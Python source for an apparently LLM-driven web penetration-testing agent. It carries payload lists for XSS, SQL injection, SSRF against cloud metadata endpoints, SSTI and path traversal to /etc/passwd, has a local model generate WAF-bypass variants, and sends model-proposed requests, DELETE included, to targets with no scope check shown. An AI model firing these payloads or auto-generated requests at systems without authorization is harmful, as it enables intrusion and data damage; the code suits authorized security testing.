"""
pin0ccsAI — Tester Agent (qwen2.5-coder:7b)  [8GB-optimised]

Key changes from v0.1:
  - Payload mutation is BATCHED: one LLM call covers ALL urls × ONE vuln_type
    instead of one call per (url, vuln_type) pair.
  - PayloadCache: mutations are cached by (vuln_type, tech_stack).
    Repeated scans against similar tech stacks never regenerate.
  - LLMBudget: hard ceiling on mutation calls (default 8) and business
    logic calls (default 1 per phase). Budget is injected by orchestrator.
  - Business logic reasoning is consolidated: one call per PHASE (not per URL).
  - Model stays loaded for the entire Tester phase - no context switching
    into llama3.1 during testing.
"""
from __future__ import annotations

import asyncio
import json
import re
import shutil
import tempfile
from pathlib import Path
from typing import Any, Optional

import httpx

from agents.base import BaseAgent
from core.config import Config
from core.database import Database
from core.exploit_memory import ExploitMemory
from core.llm_budget import LLMBudget
from core.models import Finding, ReconResult, Severity, VulnType
from core.ollama_client import OllamaClient
from core.auth_session import AuthSession
from core.payload_cache import PayloadCache

_SYSTEM_PROMPT = """You are an elite offensive security engineer.
You write precise payloads, analyze HTTP responses, and identify vulnerability patterns.
You think like an attacker - creative, methodical, adaptive.
You output ONLY valid JSON when asked for structured data."""

_BATCH_MUTATION_PROMPT = """You are a payload mutation engine for web penetration testing.

Generate exactly {n} payloads for vulnerability type: {vuln_type}

Context:
- Target URLs (representative sample):
{urls}
- Detected tech stack: {tech}
- Base payloads to mutate from: {base_payloads}

Rules:
1. Include WAF bypass variants (encoding, case folding, comment injection)
2. Include framework-specific variants if tech stack is known
3. Do NOT repeat base payloads verbatim
4. Payloads must be practical - no theoretical strings

Output a JSON array of strings ONLY. No explanation, no markdown:
["payload1", "payload2", ...]"""

_BUSINESS_LOGIC_PROMPT = """You are a senior bug bounty hunter identifying business logic flaws.

Target application summary:
- Endpoints:
{endpoint_summary}
- Tech stack: {tech}
- High-value paths:
{crown_jewels}

Identify up to {max_cases} concrete business logic test cases.
Focus on: price manipulation, privilege escalation, workflow bypass,
          race conditions, mass assignment, account takeover flows.

Output JSON array:
[
  {{
    "title": "short description",
    "url": "full URL to test",
    "method": "GET|POST|PUT|PATCH|DELETE",
    "headers": {{}},
    "body": "",
    "parameter": "key parameter name",
    "reasoning": "why this endpoint/flow may be vulnerable"
  }}
]"""

_BASE_PAYLOADS: dict[str, list[str]] = {
    "xss": [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        "javascript:alert(1)",
        "'><svg/onload=alert(1)>",
        "<x/onpointerenter=alert(1)>",
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "' OR EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://localhost:11211/",
        "http://169.254.169.254/computeMetadata/v1/",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    "lfi": [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd%00",
        "php://filter/read=convert.base64-encode/resource=index.php",
    ],
    "idor": [
        "0", "1", "2", "-1", "null", "undefined",
        "00000000-0000-0000-0000-000000000001",
        "admin", "root", "me", "self",
    ],
}

_MUTATION_ELIGIBLE = {"xss", "sqli", "ssrf", "ssti", "lfi"}


class TesterAgent(BaseAgent):
    name = "tester"

    def __init__(
        self,
        config: Config,
        db: Database,
        ollama: OllamaClient,
        budget: Optional[LLMBudget] = None,
        cache: Optional[PayloadCache] = None,
        auth: Optional[AuthSession] = None,
        exploit_memory: Optional[ExploitMemory] = None,
    ):
        super().__init__(config, db, ollama)
        self._vuln_cfg = config.vuln
        self._tools = config.tools
        self._budget = budget or LLMBudget()
        self._cache = cache or PayloadCache(config.knowledge.db_path)
        self._max_mutations = min(config.vuln.max_payload_mutations, 10)
        self._auth = auth or AuthSession.anonymous()
        # ExploitMemory: payloads proven to work, queried before base payloads
        self._memory = exploit_memory or ExploitMemory(config.knowledge.db_path)

    @property
    def model(self) -> str:
        return self.config.models.tester

    async def run_attack_phase(
        self,
        phase: dict[str, Any],
        recon: ReconResult,
        session_id: str,
    ) -> list[Finding]:
        findings: list[Finding] = []
        targets = phase.get("targets", [])[:10]
        vuln_types = phase.get("vuln_types", [])

        phase_log = self.log.bind(phase=phase.get("phase"), session=session_id)
        phase_log.info("tester.phase_start",
                       targets=len(targets), vuln_types=vuln_types)

        # Step 1: Nuclei - no LLM, run first
        nuclei_findings = await self._run_nuclei(targets)
        findings.extend(nuclei_findings)

        # Step 2: Build payload table - batched LLM calls, one per vuln_type
        tech_stack = self._extract_tech(recon)
        payload_table = await self._build_phase_payload_table(
            vuln_types=vuln_types,
            targets=targets,
            tech_stack=tech_stack,
        )
        phase_log.info("tester.payload_table_ready",
                       vuln_types_covered=len(payload_table))

        # Step 3: Fuzz using pre-built payload table - pure HTTP I/O
        for vuln_type in vuln_types:
            payloads = payload_table.get(vuln_type, _BASE_PAYLOADS.get(vuln_type, []))
            for url in targets:
                fuzz_results = await self._fuzz_endpoint(url, vuln_type, payloads)
                findings.extend(fuzz_results)

        # Step 4: Business logic - ONE call for the whole phase
        if recon.crown_jewels and self._budget.charge("tester_business"):
            logic_findings = await self._check_business_logic(
                targets=targets, recon=recon, max_cases=5,
            )
            findings.extend(logic_findings)

        phase_log.info("tester.phase_complete", raw_findings=len(findings))
        return findings

    async def _build_phase_payload_table(
        self,
        vuln_types: list[str],
        targets: list[str],
        tech_stack: list[str],
    ) -> dict[str, list[str]]:
        """
        Build the payload table for a phase.

        Layer order (highest priority first):
          0. ExploitMemory  — payloads proven to work at matching endpoint patterns
          1. KB payloads    — payloads extracted from writeups / CVEs / past scans
          2. Base payloads  — hardcoded seed payloads
          3. AI mutations   — LLM-generated variants (cached or freshly generated)

        Memory payloads come first because they have empirical confirmation.
        They skip the LLM budget entirely — no model call needed.
        The deduplication pass ensures each payload appears only once.
        """
        table: dict[str, list[str]] = {}

        for vuln_type in vuln_types:
            # ── Layer 0: ExploitMemory ─────────────────────────────────────
            # Query with the first target as the representative endpoint.
            # If multiple targets, run a secondary any-pattern query to catch
            # payloads with no pattern match for this specific endpoint shape.
            memory_payloads: list[str] = []
            if targets:
                primary_target = targets[0]
                memory_payloads = self._memory.get_payloads(
                    vuln_type=vuln_type,
                    endpoint_url=primary_target,
                    limit=15,
                )
                # Supplement with top global payloads if exact/prefix match is sparse
                if len(memory_payloads) < 5:
                    global_mem = self._memory.get_payloads_any_pattern(
                        vuln_type=vuln_type, limit=10
                    )
                    for p in global_mem:
                        if p not in memory_payloads:
                            memory_payloads.append(p)
                    memory_payloads = memory_payloads[:15]

            if memory_payloads:
                self.log.info("tester.memory_hit",
                              vuln_type=vuln_type,
                              count=len(memory_payloads),
                              pattern=ExploitMemory.extract_pattern(targets[0])
                              if targets else "(no target)")

            # ── Layer 1: KB payloads ──────────────────────────────────────
            kb_payloads = self.db.get_payloads_for_vuln(vuln_type, limit=15)

            # ── Layer 2: Base payloads ────────────────────────────────────
            base = list(_BASE_PAYLOADS.get(vuln_type, []))

            # ── Layer 3: AI mutations ─────────────────────────────────────
            mutated: list[str] = []
            if vuln_type in _MUTATION_ELIGIBLE:
                mutated = self._cache.hit(vuln_type, tech_stack)
                if mutated is not None:
                    self._budget.record_cache_hit("tester_mutation")
                    self.log.debug("tester.cache_hit",
                                   vuln_type=vuln_type, count=len(mutated))
                elif self._budget.charge("tester_mutation"):
                    mutated = await self._generate_mutations(
                        vuln_type=vuln_type,
                        targets=targets[:5],
                        tech_stack=tech_stack,
                        base_payloads=base[:4],
                        n=self._max_mutations,
                    )
                    if mutated:
                        self._cache.store(vuln_type, tech_stack, mutated)
                else:
                    mutated = []
                    self.log.debug("tester.mutation_budget_exhausted",
                                   vuln_type=vuln_type)

            # ── Merge with deduplication — memory first ────────────────────
            seen: set[str] = set()
            merged: list[str] = []
            for p in (
                memory_payloads            # Layer 0: proven payloads — highest priority
                + kb_payloads[:8]          # Layer 1: KB payloads
                + base                     # Layer 2: base seeds
                + (mutated or [])          # Layer 3: AI mutations
            ):
                if p and p not in seen:
                    seen.add(p)
                    merged.append(p)

            table[vuln_type] = merged
            self.log.debug("tester.payload_table_entry",
                           vuln_type=vuln_type,
                           total=len(merged),
                           memory=len(memory_payloads),
                           kb=min(len(kb_payloads), 8),
                           base=len(base),
                           mutated=len(mutated or []))

        return table

    def _record_failed_memory_payload(
        self,
        vuln_type: str,
        endpoint_url: str,
        payload: str,
    ) -> None:
        """
        Called by fuzzing methods when a memory payload is tried and does not
        produce a finding. Decrements the success_rate for that row.
        Only memory-sourced payloads are penalised — base/KB/mutation payloads
        are not tracked in ExploitMemory and are ignored.
        """
        self._memory.record_failure(
            vuln_type=vuln_type,
            endpoint_url=endpoint_url,
            payload=payload,
        )

    async def _generate_mutations(
        self,
        vuln_type: str,
        targets: list[str],
        tech_stack: list[str],
        base_payloads: list[str],
        n: int = 10,
    ) -> list[str]:
        url_sample = "\n".join(f"  - {u}" for u in targets[:5])
        prompt = _BATCH_MUTATION_PROMPT.format(
            n=n,
            vuln_type=vuln_type,
            urls=url_sample or "  - (no specific URL context)",
            tech=", ".join(tech_stack) if tech_stack else "unknown",
            base_payloads=json.dumps(base_payloads),
        )
        try:
            result = await self.think_json(
                prompt, system=_SYSTEM_PROMPT, temperature=0.65,
            )
            if isinstance(result, list):
                clean = [str(p).strip() for p in result if p and str(p).strip()]
                self.log.info("tester.mutations_generated",
                              vuln_type=vuln_type, count=len(clean))
                return clean[:n]
        except Exception as e:
            self.log.warning("tester.mutation_failed",
                             vuln_type=vuln_type, error=str(e))
        return []

    def _build_client(self, timeout: int = None, follow_redirects: bool = True) -> httpx.AsyncClient:
        """Build an httpx client with auth session injected."""
        t = timeout or self._vuln_cfg.ffuf_timeout
        kwargs = {"timeout": t, "verify": False, "follow_redirects": follow_redirects}
        if self._auth and self._auth.is_authenticated:
            kwargs.update(self._auth.build_client_kwargs())
        return httpx.AsyncClient(**kwargs)

    async def _run_nuclei(self, urls: list[str]) -> list[Finding]:
        findings = []
        if not shutil.which(self._tools.nuclei):
            self.log.warning("tool.missing", tool="nuclei")
            return findings

        import os
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("\n".join(urls))
            tmp_targets = f.name
        with tempfile.NamedTemporaryFile(mode="w", suffix=".jsonl", delete=False) as f:
            tmp_output = f.name

        try:
            severity_arg = ",".join(self._vuln_cfg.nuclei_severity)
            templates = Path(self._vuln_cfg.nuclei_templates).expanduser()
            cmd = [
                self._tools.nuclei,
                "-l", tmp_targets,
                "-severity", severity_arg,
                "-jsonl", "-o", tmp_output,
                "-silent", "-timeout", "10",
                "-bulk-size", "25", "-rate-limit", "100",
            ]
            if templates.exists():
                cmd += ["-t", str(templates)]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await asyncio.wait_for(proc.communicate(), timeout=600)

            output_path = Path(tmp_output)
            if output_path.exists():
                for line in output_path.read_text().splitlines():
                    if not line.strip():
                        continue
                    try:
                        result = json.loads(line)
                        f_ = self._nuclei_to_finding(result)
                        if f_:
                            findings.append(f_)
                    except json.JSONDecodeError:
                        pass
        except asyncio.TimeoutError:
            self.log.warning("nuclei.timeout")
        except Exception as e:
            self.log.warning("nuclei.failed", error=str(e))
        finally:
            for tmp in [tmp_targets, tmp_output]:
                try:
                    os.unlink(tmp)
                except Exception:
                    pass

        self.log.info("nuclei.complete", findings=len(findings))
        return findings

    def _nuclei_to_finding(self, result: dict) -> Optional[Finding]:
        info = result.get("info", {})
        sev_str = info.get("severity", "info").lower()
        sev_map = {
            "critical": Severity.CRITICAL, "high": Severity.HIGH,
            "medium": Severity.MEDIUM, "low": Severity.LOW,
        }
        return Finding(
            title=info.get("name", "Nuclei Finding"),
            vuln_type=VulnType.MISCONFIGURATION,
            severity=sev_map.get(sev_str, Severity.INFO),
            url=result.get("matched-at", result.get("host", "")),
            endpoint=result.get("matched-at", ""),
            payload=result.get("request", "")[:500],
            evidence=result.get("response", "")[:1000],
            steps_to_reproduce=[
                f"URL: {result.get('matched-at', '')}",
                f"Template: {result.get('template-id', '')}",
            ],
            impact=info.get("description", ""),
            remediation="; ".join(
                info.get("remediation", [])
                if isinstance(info.get("remediation"), list)
                else [info.get("remediation", "")]
            ),
            tool="nuclei",
            raw_output=json.dumps(result)[:2000],
            confidence=0.6,
        )

    async def _fuzz_endpoint(
        self, url: str, vuln_type: str, payloads: list[str]
    ) -> list[Finding]:
        if vuln_type in ("xss", "sqli", "ssti", "lfi"):
            return await self._param_fuzz(url, payloads, vuln_type)
        elif vuln_type == "ssrf":
            return await self._ssrf_test(url, payloads)
        elif vuln_type == "idor":
            return await self._idor_test(url, payloads)
        return []

    async def _param_fuzz(
        self, url: str, payloads: list[str], vuln_type: str
    ) -> list[Finding]:
        findings = []
        params = self._extract_params(url)
        if not params:
            return findings

        async with httpx.AsyncClient(
            timeout=self._vuln_cfg.ffuf_timeout, verify=False, follow_redirects=True
        ) as client:
            for param in params[:5]:
                for payload in payloads[:20]:
                    try:
                        test_url = self._inject_param(url, param, payload)
                        resp = await client.get(test_url)
                        finding = self._analyze_response(resp, url, param, payload, vuln_type)
                        if finding:
                            findings.append(finding)
                    except Exception:
                        pass
        return findings

    async def _ssrf_test(self, url: str, payloads: list[str]) -> list[Finding]:
        findings = []
        params = self._extract_params(url)
        url_params = [
            p for p in params
            if any(k in p.lower() for k in
                   ["url", "uri", "src", "href", "link", "redirect",
                    "next", "target", "dest", "path", "host", "proxy", "fetch", "load"])
        ] or params[:3]

        async with self._build_client(timeout=10, follow_redirects=False) as client:
            for param in url_params:
                for payload in payloads[:10]:
                    try:
                        test_url = self._inject_param(url, param, payload)
                        resp = await client.get(test_url)
                        if self._is_ssrf_indicator(resp, payload):
                            findings.append(Finding(
                                title=f"Potential SSRF in parameter '{param}'",
                                vuln_type=VulnType.SSRF,
                                severity=Severity.HIGH,
                                url=url, endpoint=test_url,
                                parameter=param, payload=payload,
                                evidence=resp.text[:500],
                                steps_to_reproduce=[
                                    f"1. GET {test_url}",
                                    "2. Response indicates internal resource access",
                                ],
                                impact="SSRF may expose internal services, cloud metadata, or enable network pivoting",
                                tool="tester_agent",
                                confidence=0.5,
                            ))
                    except Exception:
                        pass
        return findings

    async def _idor_test(self, url: str, payloads: list[str]) -> list[Finding]:
        findings = []
        from urllib.parse import urlparse
        parsed = urlparse(url)
        path_parts = parsed.path.split("/")
        id_positions = [
            i for i, p in enumerate(path_parts)
            if re.match(r"^\d+$", p)
            or re.match(r"^[0-9a-f]{8}-[0-9a-f]{4}-", p, re.I)
        ]
        if not id_positions:
            return findings

        async with self._build_client(timeout=10) as client:
            for pos in id_positions[:2]:
                original_id = path_parts[pos]
                for test_id in payloads[:10]:
                    if test_id == original_id:
                        continue
                    new_parts = path_parts.copy()
                    new_parts[pos] = test_id
                    test_url = parsed._replace(path="/".join(new_parts)).geturl()
                    try:
                        resp = await client.get(test_url)
                        if resp.status_code == 200 and len(resp.text) > 100:
                            findings.append(Finding(
                                title=f"Potential IDOR at {url}",
                                vuln_type=VulnType.IDOR,
                                severity=Severity.HIGH,
                                url=url, endpoint=test_url,
                                parameter=f"path[{pos}]",
                                payload=test_id,
                                evidence=resp.text[:500],
                                steps_to_reproduce=[
                                    "1. Authenticate as any user",
                                    f"2. Access {test_url}",
                                    f"3. Observe data returned for ID '{test_id}'",
                                ],
                                impact="Unauthorized access to other users' resources",
                                tool="tester_agent",
                                confidence=0.5,
                            ))
                    except Exception:
                        pass
        return findings

    async def _check_business_logic(
        self, targets: list[str], recon: ReconResult, max_cases: int = 5,
    ) -> list[Finding]:
        endpoint_summary = "\n".join(f"  {u}" for u in targets[:15])
        tech = ", ".join(self._extract_tech(recon)) or "unknown"
        crown_summary = "\n".join(
            f"  [{ep.crown_jewel_score}] {ep.url}"
            for ep in recon.crown_jewels[:8]
        )

        prompt = _BUSINESS_LOGIC_PROMPT.format(
            endpoint_summary=endpoint_summary,
            tech=tech,
            crown_jewels=crown_summary or "  (none identified)",
            max_cases=max_cases,
        )

        try:
            cases = await self.think_json(prompt, system=_SYSTEM_PROMPT, temperature=0.3)
            if not isinstance(cases, list):
                return []
        except Exception as e:
            self.log.debug("business_logic.llm_failed", error=str(e))
            return []

        findings = []
        async with self._build_client(timeout=10) as client:
            for case in cases[:max_cases]:
                url = case.get("url", "")
                if not url:
                    continue
                try:
                    method = case.get("method", "GET").upper()
                    body = case.get("body", "")
                    headers = case.get("headers", {})
                    resp = await client.request(
                        method, url,
                        content=body or None,
                        headers=headers,
                    )
                    if resp.status_code < 400:
                        findings.append(Finding(
                            title=case.get("title", "Business Logic Candidate"),
                            vuln_type=VulnType.BUSINESS_LOGIC,
                            severity=Severity.MEDIUM,
                            url=url, endpoint=url,
                            parameter=case.get("parameter", ""),
                            payload=body,
                            evidence=resp.text[:500],
                            steps_to_reproduce=[
                                f"1. {method} {url}",
                                f"2. Headers: {headers}" if headers else "2. No custom headers",
                                f"3. Body: {body}" if body else "3. No request body",
                                f"4. Response: HTTP {resp.status_code}",
                            ],
                            impact=case.get("reasoning", ""),
                            tool="tester_agent_ai",
                            confidence=0.4,
                        ))
                except Exception:
                    pass
        return findings

    def _analyze_response(
        self, resp: httpx.Response, url: str, param: str,
        payload: str, vuln_type: str,
    ) -> Optional[Finding]:
        body = resp.text

        if vuln_type == "xss":
            if (resp.status_code == 200 and payload in body
                    and any(ind in payload.lower()
                            for ind in ["<script", "onerror", "onload",
                                        "javascript:", "svg", "onpointer"])):
                return Finding(
                    title=f"Reflected XSS in '{param}'",
                    vuln_type=VulnType.XSS_REFLECTED, severity=Severity.HIGH,
                    url=url, endpoint=url, parameter=param, payload=payload,
                    evidence=body[:500],
                    steps_to_reproduce=[
                        f"1. Navigate to: {url}",
                        f"2. Set '{param}' = {payload}",
                        "3. Observe unescaped reflection in response",
                    ],
                    impact="Arbitrary JavaScript execution in victim browser",
                    tool="tester_agent", confidence=0.65,
                )
        elif vuln_type == "sqli":
            sql_errors = [
                "sql syntax", "mysql_fetch", "ora-01", "sqlite_",
                "syntax error", "unclosed quotation",
                "you have an error in your sql",
                "supplied argument is not a valid mysql", "warning: mysql",
            ]
            if any(e in body.lower() for e in sql_errors):
                return Finding(
                    title=f"SQL Injection in '{param}'",
                    vuln_type=VulnType.SQLI, severity=Severity.CRITICAL,
                    url=url, endpoint=url, parameter=param, payload=payload,
                    evidence=body[:500],
                    steps_to_reproduce=[
                        f"1. Request {url}",
                        f"2. Set '{param}' = {payload}",
                        "3. Observe SQL error in response",
                    ],
                    impact="Full database read/write, potential RCE",
                    tool="tester_agent", confidence=0.7,
                )
        elif vuln_type == "ssti":
            if "49" in body and any(t in payload for t in ["{{", "${", "<%="]):
                return Finding(
                    title=f"SSTI in '{param}'",
                    vuln_type=VulnType.SSTI, severity=Severity.CRITICAL,
                    url=url, endpoint=url, parameter=param, payload=payload,
                    evidence=body[:300],
                    steps_to_reproduce=[
                        f"1. Send {url} with {param}={payload}",
                        "2. Response contains '49' - template expression evaluated",
                    ],
                    impact="Remote Code Execution via server-side template engine",
                    tool="tester_agent", confidence=0.85,
                )
        elif vuln_type == "lfi":
            lfi_indicators = [
                "root:x:0:0", "root:*:", "/bin/bash",
                "[boot loader]", "[operating systems]", "<?php",
            ]
            if any(ind in body for ind in lfi_indicators):
                return Finding(
                    title=f"LFI in '{param}'",
                    vuln_type=VulnType.LFI, severity=Severity.CRITICAL,
                    url=url, endpoint=url, parameter=param, payload=payload,
                    evidence=body[:500],
                    steps_to_reproduce=[
                        f"1. Request {url}",
                        f"2. Set '{param}' = {payload}",
                        "3. Observe local file contents in response",
                    ],
                    impact="Arbitrary file read, potential RCE via log poisoning",
                    tool="tester_agent", confidence=0.8,
                )
        return None

    def _is_ssrf_indicator(self, resp: httpx.Response, payload: str) -> bool:
        body = resp.text.lower()
        if "169.254.169.254" in payload or "metadata" in payload:
            if any(kw in body for kw in
                   ["ami-id", "instance-id", "meta-data",
                    "computemetadata", "security-credentials"]):
                return True
        if "file://" in payload:
            if "root:x:0:0" in body or len(body) > 50:
                return True
        return False

    def _extract_tech(self, recon: ReconResult) -> list[str]:
        techs: set[str] = set()
        for tech_list in recon.tech_stack.values():
            techs.update(t.lower().strip() for t in tech_list if t)
        return sorted(techs)

    def _extract_params(self, url: str) -> list[str]:
        from urllib.parse import urlparse, parse_qs
        return list(parse_qs(urlparse(url).query).keys())

    def _inject_param(self, url: str, param: str, value: str) -> str:
        from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
